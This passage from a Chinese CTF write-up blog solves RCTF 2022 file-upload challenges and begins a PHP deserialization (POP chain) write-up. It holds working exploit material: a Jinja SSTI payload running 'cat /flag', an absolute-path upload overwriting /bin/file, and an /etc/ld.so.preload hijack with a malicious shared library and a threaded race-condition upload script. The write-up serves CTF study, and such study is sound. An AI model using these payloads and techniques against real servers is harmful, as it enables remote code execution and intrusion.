(^=◕ᴥ◕=^) (^=◕ᴥ◕=^) (^=◕ᴥ◕=^)&quot;</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                f.save(filepath)</span><br><span class="line">                file_check_res = subprocess.check_output(</span><br><span class="line">                    [<span class="string">&quot;/bin/file&quot;</span>, <span class="string">&quot;-b&quot;</span>, filepath], </span><br><span class="line">                    shell=<span class="literal">False</span>, </span><br><span class="line">                    encoding=<span class="string">&#x27;utf-8&#x27;</span>,</span><br><span class="line">                    timeout=<span class="number">1</span></span><br><span class="line">                )</span><br><span class="line">                os.remove(filepath)</span><br><span class="line">                <span class="keyword">if</span> <span class="string">&quot;empty&quot;</span> <span class="keyword">in</span> file_check_res <span class="keyword">or</span> <span class="string">&quot;cannot open&quot;</span> <span class="keyword">in</span> file_check_res:</span><br><span class="line">                    file_check_res=<span class="string">&quot;wafxixi ฅ•ω•ฅ ฅ•ω•ฅ ฅ•ω•ฅ&quot;</span></span><br><span class="line">                <span class="keyword">return</span> render_template_string(file_check_res)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>, result=<span class="string">&#x27;Error ฅ(๑*д*๑)ฅ ฅ(๑*д*๑)ฅ ฅ(๑*д*๑)ฅ&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    serve(app, host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">3000</span>, threads=<span class="number">1000</span>, cleanup_interval=<span class="number">30</span>)</span><br></pre></td></tr></table></figure>

<p>开始看到<code>flask</code>就猜想这里存在的是<code>ssti</code></p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template, render_template_string</span><br></pre></td></tr></table></figure>

<p>在这里发现它对我们上传的文件进行<code>file</code>命令</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"> file_check_res = subprocess.check_output(</span><br><span class="line">   [<span class="string">&quot;/bin/file&quot;</span>, <span class="string">&quot;-b&quot;</span>, filepath], </span><br><span class="line">   shell=<span class="literal">False</span>, </span><br><span class="line">   encoding=<span class="string">&#x27;utf-8&#x27;</span>,</span><br><span class="line">   timeout=<span class="number">1</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<p>然后将返回值传给<code>file_check_res</code></p>
<p>最后一行是关键</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">return</span> render_template_string(file_check_res)</span><br></pre></td></tr></table></figure>

<p>它将<code>file_check_res</code>进行渲染，所以如果我们可以控制<code>file</code>命令后的文件返回值是一个<code>ssti</code>注入语句那么就可以实现对网站的<code>ssti</code>，并利用这个返回值返回<code>flag</code></p>
<p>如果单纯写个包含ssti语句的文本</p>
<p><a data-fancybox="gallery" data-src="/2022RCTF/image-20230312223454421.png"><img src="/2022RCTF/image-20230312223454421.png" alt="image-20230312223454421"></a></p>
<p>发现执行完<code>file -b</code>后，执行后只显示文件类型</p>
<h3 id="file-b解析-后内容显示"><a href="#file-b解析-后内容显示" class="headerlink" title="file -b解析#!后内容显示"></a>file -b解析#!后内容显示</h3><p>这里就需要一个知识点<code>#!</code>后的内容，会被视为文件的解释器，然后打印出来，比如</p>
<p><a data-fancybox="gallery" data-src="/2022RCTF/image-20230312224705119.png"><img src="/2022RCTF/image-20230312224705119.png" alt="image-20230312224705119"></a></p>
<p>这里</p>
<figure class="highlight handlebars"><table><tr><td class="code"><pre><span class="line"><span class="language-xml">a </span><span class="template-variable">&#123;&#123;<span class="name">config.__class__.__init__.__globals__</span>[&#x27;os&#x27;].popen(<span class="name">&#x27;cat /flag&#x27;</span>).read()&#125;&#125;</span><span class="language-xml"> script, ASCII text executable</span></span><br></pre></td></tr></table></figure>

<p>就看出来它把文本</p>
<figure class="highlight handlebars"><table><tr><td class="code"><pre><span class="line"><span class="template-variable">&#123;&#123;<span class="name">config.__class__.__init__.__globals__</span>[&#x27;os&#x27;].popen(<span class="name">&#x27;cat /flag&#x27;</span>).read()&#125;&#125;</span></span><br></pre></td></tr></table></figure>

<p>当作了<code>script</code>解析器，在解析文件类型时，就把它打印出来了</p>
<p>于是我们上传该文件</p>
<p><a data-fancybox="gallery" data-src="/2022RCTF/image-20230312224941575.png"><img src="/2022RCTF/image-20230312224941575.png" alt="image-20230312224941575"></a></p>
<p>得到flag</p>
<h2 id="filecheacker-pro"><a href="#filecheacker-pro" class="headerlink" title="filecheacker_pro"></a>filecheacker_pro</h2><blockquote>
<p>hint:<code>An easier file check challenge.</code><br><code>The zip decompression password is the flag value of filechecker_mini.</code><br><code>Test your exploit locally first.</code><br><code>The challenging environment restarts every three minutes.</code></p>
<p>更简单的文件检查挑战。<br>zip 解压缩密码是 filechecker_mini 的flag。<br>首先在本地测试漏洞利用。<br>具有挑战性的环境每三分钟重新启动一次。</p>
</blockquote>
<p>看看源码和mini的区别</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template, render_template_string</span><br><span class="line"><span class="keyword">from</span> waitress <span class="keyword">import</span> serve</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"></span><br><span class="line">app_dir = os.path.split(os.path.realpath(__file__))[<span class="number">0</span>]</span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>] = <span class="string">f&#x27;<span class="subst">&#123;app_dir&#125;</span>/upload/&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>,<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> request.method == <span class="string">&#x27;GET&#x27;</span>:</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>,result=<span class="string">&quot;ヽ(=^･ω･^=)丿 ヽ(=^･ω･^=)丿 ヽ(=^･ω･^=)丿&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">elif</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">            f = request.files[<span class="string">&#x27;file-upload&#x27;</span>]</span><br><span class="line">            filepath = os.path.join(app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>], f.filename)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> os.path.exists(filepath) <span class="keyword">and</span> <span class="string">&quot;..&quot;</span> <span class="keyword">in</span> filepath:</span><br><span class="line">                <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>, result=<span class="string">&quot;Don&#x27;t (^=◕ᴥ◕=^) (^=◕ᴥ◕=^) (^=◕ᴥ◕=^)&quot;</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                f.save(filepath)</span><br><span class="line">                file_check_res = subprocess.check_output(</span><br><span class="line">                    [<span class="string">&quot;/bin/file&quot;</span>, <span class="string">&quot;-b&quot;</span>, filepath], </span><br><span class="line">                    shell=<span class="literal">False</span>, </span><br><span class="line">                    encoding=<span class="string">&#x27;utf-8&#x27;</span>,</span><br><span class="line">                    timeout=<span class="number">1</span></span><br><span class="line">                )</span><br><span class="line">                os.remove(filepath)</span><br><span class="line">                <span class="keyword">if</span> <span class="string">&quot;empty&quot;</span> <span class="keyword">in</span> file_check_res <span class="keyword">or</span> <span class="string">&quot;cannot open&quot;</span> <span class="keyword">in</span> file_check_res:</span><br><span class="line">                    file_check_res=<span class="string">&quot;wafxixi ฅ•ω•ฅ ฅ•ω•ฅ ฅ•ω•ฅ&quot;</span></span><br><span class="line">                <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>, result=file_check_res)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>, result=<span class="string">&#x27;Error ฅ(๑*д*๑)ฅ ฅ(๑*д*๑)ฅ ฅ(๑*д*๑)ฅ&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    serve(app, host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">3000</span>, threads=<span class="number">1000</span>, cleanup_interval=<span class="number">30</span>)</span><br></pre></td></tr></table></figure>

<p>发现在</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>, result=file_check_res)</span><br></pre></td></tr></table></figure>

<p>看来是无法进行ssti注入</p>
<p>后面查看wp发现<code>os.path.join</code>存在一个技巧</p>
<p>如果只是单纯的文件名字</p>
<figure class="highlight lua"><table><tr><td class="code"><pre><span class="line"><span class="built_in">os</span>.<span class="built_in">path</span>.join(<span class="string">&#x27;path&#x27;</span>,<span class="string">&#x27;abc&#x27;</span>,<span class="string">&#x27;yyy.txt&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>那么路径就是<code>path/abc/yyy.txt</code></p>
<p>如果后面的参数包含了<code>&#39;/&#39;</code>，那么前面的路径就会被忽略</p>
<p>比如，</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">os.path.join(<span class="string">&#x27;aaa&#x27;</span>,<span class="string">&#x27;/bbb/ccc.txt&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>那么路径就是<code>/bbb/ccc.txt</code>，而前面得<code>aaa</code>目录路径就被无视了</p>
<p>于是在源码中这里，</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">filepath = os.path.join(app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>], f.filename)</span><br></pre></td></tr></table></figure>

<p>如果我们的文件名改成<code>/bin/file</code>会怎么样呢…</p>
<p>那就代表<code>/bin/file</code>文件就被我们覆盖了，于是可以不用<code>..</code>跨目录也可以进行文件上传或者覆盖</p>
<p>当在这里执行<code>/bin/file</code>时，就相当于执行我们的文件内容</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">file_check_res = subprocess.check_output(</span><br><span class="line">                   [<span class="string">&quot;/bin/file&quot;</span>, <span class="string">&quot;-b&quot;</span>, filepath], </span><br><span class="line">                   shell=<span class="literal">False</span>, </span><br><span class="line">                   encoding=<span class="string">&#x27;utf-8&#x27;</span>,</span><br><span class="line">                   timeout=<span class="number">1</span></span><br><span class="line">               ) file_check_res = subprocess.check_output(</span><br><span class="line">                   [<span class="string">&quot;/bin/file&quot;</span>, <span class="string">&quot;-b&quot;</span>, filepath], </span><br><span class="line">                   shell=<span class="literal">False</span>, </span><br><span class="line">                   encoding=<span class="string">&#x27;utf-8&#x27;</span>,</span><br><span class="line">                   timeout=<span class="number">1</span></span><br><span class="line">               )</span><br></pre></td></tr></table></figure>

<p>那么就显而易见我们可以构造</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="built_in">cat</span> /flag</span><br></pre></td></tr></table></figure>

<p>直接得到flag</p>
<blockquote>
<p>注意unix中是行尾只有换行也就是<code>\n</code>，而win中才是以<code>\r\n</code>结尾</p>
<p>而bp中改包的时候，回车会以win方式生成<code>\r\n</code>这两个 ,所以如果直接传上去覆盖<code>/bin/file</code>，实际上格式是错误的，无法执行，就会报错，所以需要删除<code>\r</code></p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/2022RCTF/image-20230314163249778.png"><img src="/2022RCTF/image-20230314163249778.png" alt="image-20230314163249778"></a></p>
<h2 id="filecheacker-pro-max"><a href="#filecheacker-pro-max" class="headerlink" title="filecheacker_pro_max"></a>filecheacker_pro_max</h2><blockquote>
<p>hint:<code>The zip decompression password is the flag value of filechecker_plus.</code><br><code>Test your exploit locally first.</code><br><code>The challenging environment restarts every three minutes.</code></p>
<p>zip 解压缩密码是 filechecker_plus 的flag。<br>首先在本地测试漏洞利用。<br>具有挑战性的环境每三分钟重新启动一次。</p>
</blockquote>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template</span><br><span class="line"><span class="keyword">from</span> waitress <span class="keyword">import</span> serve</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"></span><br><span class="line">app_dir = os.path.split(os.path.realpath(__file__))[<span class="number">0</span>]</span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>] = <span class="string">f&#x27;<span class="subst">&#123;app_dir&#125;</span>/upload/&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>,<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> request.method == <span class="string">&#x27;GET&#x27;</span>:</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>,result=<span class="string">&quot;ヽ(=^･ω･^=)丿 ヽ(=^･ω･^=)丿 ヽ(=^･ω･^=)丿&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">elif</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">            f = request.files[<span class="string">&#x27;file-upload&#x27;</span>]</span><br><span class="line">            filepath = os.path.join(app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>], f.filename)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> os.path.exists(filepath):</span><br><span class="line">                <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>, result=<span class="string">f&quot;<span class="subst">&#123;filepath&#125;</span> already exists (^=◕ᴥ◕=^) (^=◕ᴥ◕=^) (^=◕ᴥ◕=^)&quot;</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                f.save(filepath)</span><br><span class="line">                file_check_res = subprocess.check_output(</span><br><span class="line">                    [<span class="string">&quot;/bin/file&quot;</span>, <span class="string">&quot;-b&quot;</span>, filepath], </span><br><span class="line">                    shell=<span class="literal">False</span>, </span><br><span class="line">                    encoding=<span class="string">&#x27;utf-8&#x27;</span>,</span><br><span class="line">                    timeout=<span class="number">1</span></span><br><span class="line">                )</span><br><span class="line">                os.remove(filepath)</span><br><span class="line">                <span class="keyword">if</span> <span class="string">&quot;empty&quot;</span> <span class="keyword">in</span> file_check_res <span class="keyword">or</span> <span class="string">&quot;cannot open&quot;</span> <span class="keyword">in</span> file_check_res:</span><br><span class="line">                    file_check_res=<span class="string">&quot;wafxixi ฅ•ω•ฅ ฅ•ω•ฅ ฅ•ω•ฅ&quot;</span></span><br><span class="line">                <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>, result=file_check_res)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>, result=<span class="string">&#x27;Error ฅ(๑*д*๑)ฅ ฅ(๑*д*๑)ฅ ฅ(๑*д*๑)ฅ&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    serve(app, host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">3000</span>, threads=<span class="number">1000</span>, cleanup_interval=<span class="number">30</span>)</span><br></pre></td></tr></table></figure>

<p>和上道题目题目不同，这道题修复了文件覆盖，</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>, result=<span class="string">f&quot;<span class="subst">&#123;filepath&#125;</span> already exists (^=◕ᴥ◕=^) (^=◕ᴥ◕=^) (^=◕ᴥ◕=^)&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>但是仍然可以利用这里</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">filepath = os.path.join(app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>], f.filename)</span><br></pre></td></tr></table></figure>

<p>进行跨目录文件上传</p>
<p>我们仍然需要实现rce，但是服务器shell中唯一执行的命令只有<code>/bin/file -b</code></p>
<h3 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h3><blockquote>
<ul>
<li>使用 <code>strace</code> 命令查看系统调用【通过这个命令，查看<code>/bin/file</code>命令执行的调用过程，看看有没有可以中间利用劫持的，这个需要进docker中查看】</li>
<li></li>
</ul>
</blockquote>
<p>我们需要找的是<code>/bin/file</code>命令执行过程中调用的文件，并且这个文件不存在，这样我们才可以成功上传</p>
<p><a data-fancybox="gallery" data-src="/2022RCTF/image-20230315000016107.png"><img src="/2022RCTF/image-20230315000016107.png" alt="image-20230315000016107"></a></p>
<p>这里就看到一个合适的目标文件</p>
<blockquote>
<p><code>/etc/ld.so.preload</code>，因为其不存在，但是在执行<code>/bin/file</code>时会调用它</p>
<p>确实不认识这个文件，搜一下得到</p>
</blockquote>
<blockquote>
<p><code>/etc/ld.so.preload</code>在某种程度上取代了<em>LD_PRELOAD</em>。</p>
<p><em>由于</em>安全问题，<code>LD_PRELOAD</code>受到严格的限制：它<code>不能执行任意的setuid二进制文件</code>，因为如果可以的话，你可以用自己的恶意代码替换库例程，例如在这里进行很好的讨论。事实上，你可以在<a href="https://linux.die.net/man/8/ld.so">ld.so用户手册</a>中阅读：</p>
<blockquote>
<p><strong>LD_PRELOAD</strong></p>
<p>要在所有其他库之前加载的其他用户指定的 ELF 共享库的列表。列表中的项目可以用空格或冒号分隔。这可用于有选择地覆盖其他共享库中的函数。使用“说明”下给出的规则搜索库。对于 set-user-ID&#x2F;set-group-ID ELF 二进制文件，将忽略包含斜杠的预加载路径名，并且仅当在库文件上启用了 set-user-ID 权限位时，才会加载标准搜索目录中的库。</p>
</blockquote>
<p>相反，文件 &#x2F;etc&#x2F;<em>ld.so.preload</em> 没有这样的限制，其想法是，如果你<code>可以读/写目录 /etc</code>，你就已经有了 root 凭据。因此它的使用。</p>
<p>请记住<em>，即使一开始</em>您似乎没有 <code>/etc/ld.so.preload</code>，您也可以使用 <code>/etc/ld.so.preload</code>：它只不过是 <em><code>glibc</code></em> 的一个功能，因此是所有 Linux 发行版（但据我所知，不是 Unix 风格），因此您可以创建它并将任何 Linux 发行版中<strong>任何</strong> setuid 库的名称放入其中， 它会起作用。</p>
</blockquote>
<p>也就是说它是一个加载库的配置文件，相当于命令的所需库的配置，当命令执行时其中的二进制配置文件也会被认为是该命令执行的一个部分进行加载执行</p>
<blockquote>
<p>所以我们需要上传两个文件，一个是能够执行<code>cat /flag</code>的二进制文件，一个是<code>/etc/ld.so.preload</code>文件，而且<code>/etc/ld.so.preload</code>中需要包含改二进制文件路径，以实现加载的目的</p>
</blockquote>
<blockquote>
<p>*所谓的库，实际上就是<code>/bin/file</code>命令执行过程中用到的函数的定义库，而上传的二进制文件的主要目的就是劫持<code>/bin/file</code>命令中的利用的函数，进行重新定义</p>
</blockquote>
<p>在<a href="https://github.com/file/file/blob/30ad4181ef4f2f09d36aee1163386b8d2904d0e0/src/magic.h.in">file&#x2F;magic.h.in at 30ad4181ef4f2f09d36aee1163386b8d2904d0e0 · file&#x2F;file (github.com)</a>中查看file利用的函数，发现<code>magic_version()</code>很合适，因为它不需要参数</p>
<p><a data-fancybox="gallery" data-src="/2022RCTF/image-20230315210955814.png"><img src="/2022RCTF/image-20230315210955814.png" alt="image-20230315210955814"></a></p>
<h3 id="构造利用文件"><a href="#构造利用文件" class="headerlink" title="构造利用文件"></a>构造利用文件</h3><p>于是构造二进制文件</p>
<p><code>haha.c</code></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">magic_version</span><span class="params">()</span> &#123;</span><br><span class="line">  system(<span class="string">&quot;cat /flag&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gcc haha.c -o haha.so -fPIC -shared -ldl -D_GNU_SOURCE</span><br><span class="line"><span class="comment">#-fPIC: 指定生成位置无关代码（Position-Independent Code, PIC），这是必要的，因为共享库可以在内存中的任意位置加载，所以需要确保代码中的地址引用是相对的而不是绝对的。</span></span><br><span class="line"><span class="comment">#-shared: 指定生成共享库，这意味着代码将被编译成一个动态链接库（也称为共享对象），而不是可执行文件。</span></span><br><span class="line"><span class="comment">#-ldl: 链接动态加载器库（Dynamic Loading Library, dl），这个库提供了动态加载和链接共享库的接口，程序可以使用它来在运行时加载和链接共享库。</span></span><br><span class="line"><span class="comment">#-D_GNU_SOURCE: 定义一个宏，它告诉编译器使用 GNU 标准库的特定功能，这些功能不是 C 标准的一部分。</span></span><br></pre></td></tr></table></figure>

<p>得到<code>haha.so</code>，我们可以将其传到&#x2F;tmp下，避免在upload目录下被</p>
<p>于是可以构造<code>/etc/ld.so.preload</code>内容</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line"><span class="regexp">/tmp/</span>haha.so</span><br></pre></td></tr></table></figure>

<p>这样它就会加载<code>/tmp/haha.so</code></p>
<hr>
<p>但是上传完一个文件后，执行完<code>/bin/file</code>，会执行</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">os.remove(filepath)</span><br></pre></td></tr></table></figure>

<p>删除该文件，所以想要在实现上面操作，就必须在&#x2F;bin&#x2F;file执行前将两个文件上传上去，才能实现劫持该命令实现<code>cat /flag</code>，所以这里需要进行条件竞争</p>
<p>写个简单py进行竞争，或者用bp放包</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://192.168.80.138:3000/&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload1</span>():</span><br><span class="line">    file = &#123;<span class="string">&quot;file-upload&quot;</span>: (<span class="string">&quot;/etc/ld.so.preload&quot;</span>, <span class="built_in">open</span>(<span class="string">&quot;./ld.so.preload&quot;</span>, <span class="string">&quot;r&quot;</span>))&#125;</span><br><span class="line">    res = requests.post(url, files=file)</span><br><span class="line">    <span class="built_in">print</span>(re.findall(<span class="string">&quot;&lt;h3&gt;(.*)&lt;/h3&gt;&quot;</span>, res.text, re.S)[<span class="number">0</span>])</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload2</span>():</span><br><span class="line">    file = &#123;<span class="string">&quot;file-upload&quot;</span>: (<span class="string">&quot;/tmp/haha.so&quot;</span>, <span class="built_in">open</span>(<span class="string">&quot;./haha.so&quot;</span>, <span class="string">&quot;rb&quot;</span>))&#125;</span><br><span class="line">    res = requests.post(url, files=file)</span><br><span class="line">    <span class="built_in">print</span>(re.findall(<span class="string">&quot;&lt;h3&gt;(.*)&lt;/h3&gt;&quot;</span>, res.text, re.S)[<span class="number">0</span>])</span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">        threading.Thread(target=upload1).start()</span><br><span class="line">        threading.Thread(target=upload2).start()</span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/2022RCTF/image-20230315222627587.png"><img src="/2022RCTF/image-20230315222627587.png" alt="image-20230315222627587"></a></p>
<p>得到flag</p>
<h2 id="C3"><a href="#C3" class="headerlink" title="C3"></a>C3</h2><p>一道0解的题目，最后提示了端口，看到就想到<code>Cobaltstrike</code>但是不知道怎么利用，于是准备复现<code>CVE-2022-39197</code>，当作题目复现了，内容写在在<code>CVE漏洞学习</code></p>
<blockquote>
<p>hint：</p>
<p>Command and Control.</p>
<p>该题无需爆破；</p>
<p>port 50050</p>
</blockquote>
<p>这是一道<code>CVE-2022-39197</code>【<code>Cobaltstrike RCE</code>】真实环境中的漏洞利用</p>
]]></content>
      <categories>
        <category>网络安全学习</category>
      </categories>
      <tags>
        <tag>Game</tag>
      </tags>
  </entry>
  <entry>
    <title>DASCTF X GFCTF 2022十月挑战赛</title>
    <url>/2022DASCTF%20X%20GFCTF%E5%8D%81%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B-wp/</url>
    <content><![CDATA[<p><code>有水平的</code></p>
<span id="more"></span>

<h1 id="DASCTF-X-GFCTF-2022十月挑战赛"><a href="#DASCTF-X-GFCTF-2022十月挑战赛" class="headerlink" title="DASCTF X GFCTF 2022十月挑战赛"></a>DASCTF X GFCTF 2022十月挑战赛</h1><h2 id="1-EasyPOP"><a href="#1-EasyPOP" class="headerlink" title="1.EasyPOP"></a>1.EasyPOP</h2><p>一道构造<code>pop</code>链的题，拿来练习一下分析能力</p>
<p>做反序列构造<code>pop</code>链最重要还是要会联想，从而触发方法</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">fine</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$cmd</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$content</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$cmd</span>, <span class="variable">$content</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;cmd = <span class="variable">$cmd</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;content = <span class="variable">$content</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$this</span>-&gt;cmd, <span class="variable">$this</span>-&gt;content);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;cmd = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Go listen to Jay Chou&#x27;s secret-code! Really nice&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">show</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ctf</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$time</span> = <span class="string">&quot;Two and a half years&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$ctf</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;ctf = <span class="variable">$ctf</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;ctf-&gt;<span class="title function_ invoke__">show</span>();</span><br><span class="line"> <span class="comment">//show类有this-&gt;ctf-&gt;show() 联想一下__call函数，或者看看其他类有show函数没，在secret_code类中发现有show函数，而其函数内语句会触发__get魔术，而__get魔术会触发fine类的__invoke魔术，其中的call_user_func就是实现反序列化命令执行的关键，所以这里并不触发__call魔术</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">show</span>(<span class="params"></span>): <span class="title">string</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;ctf . <span class="string">&quot;: Duration of practice: &quot;</span> . <span class="variable language_">$this</span>-&gt;time;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">sorry</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$name</span>;</span><br><span class="line">    <span 